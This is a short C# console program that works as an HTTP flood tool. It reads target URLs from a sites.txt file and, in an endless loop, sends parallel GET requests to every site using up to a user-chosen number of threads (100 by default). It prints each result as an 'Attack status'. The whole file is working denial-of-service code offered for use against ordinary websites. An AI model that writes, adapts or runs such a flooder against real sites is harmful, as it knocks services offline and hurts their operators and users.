using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;

namespace NOWARASPNET
{
    internal class Program
    {
        private const int defaultThreads = 100;

        static void Main(string[] args)
        {
            MainAsync().GetAwaiter().GetResult();
        }


        static async Task MainAsync()
        {

            Console.Write("Enter the number of threads (default 100): ");
            string threadInput = Console.ReadLine();

            int threads = defaultThreads;
            int.TryParse(threadInput, out threads);
            if (threads == 0)
            {
                threads = defaultThreads;
            }

            Console.WriteLine($"Number of threads set to: {threads}");


            string[] sites = File.ReadAllLines(Environment.CurrentDirectory.ToString() + "\\sites.txt");

            var request = new Request();
            while (true)
            {
                await Task.Run(() => Parallel.ForEach(sites, new ParallelOptions { MaxDegreeOfParallelism = threads }, site =>
                {
                    _ = request.Get(site);
                }));
            }
        }
    }

    class Request
    {
        private readonly HttpClient _httpClient = new HttpClient();
        public async Task Get(string url)
        {
            try
            {
                var response = await _httpClient.GetAsync(url);
                Console.WriteLine($"Site: {url}; Attack status: {response.StatusCode}");
            }
            catch (Exception)
            {

                Console.WriteLine($"Site: {url}; Attack status: connection refused!");
            }

        }
    }
}


